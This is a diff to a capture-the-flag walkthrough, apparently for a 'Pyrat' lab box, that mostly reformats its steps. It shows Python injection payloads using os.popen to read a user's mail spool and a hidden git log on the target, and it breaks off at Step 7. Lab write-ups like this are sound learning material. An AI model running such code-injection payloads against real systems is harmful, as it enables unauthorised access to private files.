@@ -70,34 +70,61 @@ sys
 tmp
 usr
 var
-# Step 6 In this now i will explore various directories in point of veiw of flag
+# Step 6
+
+In this now i will explore various directories in point of veiw of flag
+
 so now i explore var
+
 print(__import__('os').popen('cat /var/mail/think').read())
+
 From root@pyrat  Thu Jun 15 09:08:55 2023
+
 Return-Path: <root@pyrat>
+
 X-Original-To: think@pyrat
+
 Delivered-To: think@pyrat
+
 Received: by pyrat.localdomain (Postfix, from userid 0)
+
         id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
+        
 Subject: Hello
+
 To: <think@pyrat>
+
 X-Mailer: mail (GNU Mailutils 3.7)
+
 Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
+
 Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
+
 From: Dbile Admen <root@pyrat>
 
 Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
 
 -- where i got this information
-# Step 6 Now i go in the folder of the .git
+
+# Step 6 
+
+Now i go in the folder of the .git
+
 print(__import__('os').popen('git --git-dir=/opt/dev/.git log').read())
+
 commit 0a3c36d66369fd4b07ddca72e5379461a63470bf
+
 Author: Jose Mario <josemlwdf@github.com>
+
 Date:   Wed Jun 21 09:32:14 2023 +0000
 
+
     Added shell endpoint
+    
 
 --- where i got this type of information in this
+
+
 Note - Now at this point i know some basic details which is in these two 
 
 # Step 7 - 
